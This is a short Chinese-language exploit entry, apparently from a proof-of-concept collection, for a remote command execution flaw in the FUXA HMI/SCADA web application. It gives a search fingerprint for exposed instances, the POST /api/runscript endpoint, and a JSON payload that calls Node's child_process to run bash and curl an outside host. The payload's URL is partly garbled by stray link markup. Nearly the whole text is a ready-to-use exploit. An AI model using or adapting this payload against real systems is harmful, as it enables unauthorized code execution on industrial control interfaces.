# FUXA远程命令执行漏洞

FUXA ｜ 命令执行 ｜ —
- **指纹**：`title="FUXA"`
- **请求**：`POST /api/runscript HTTP/1.1`

**Payload**
```
{"headers": {"normalizedNames": {}, "lazyUpdate": "null"}, "params": {"script": {"parameters": [{"name": "ok", "type": "tagid", "value": ""}], "mode": "", "id": "", "test": "true", "name": "ok", "outputId": "", "code": "require('child_process').exec('/bin/bash -c \"curl [http://www.baidu.com\"')"}}}](http://www.baidu.com%5C%22')%22%7D%7D%7D)
```
- **响应特征**：200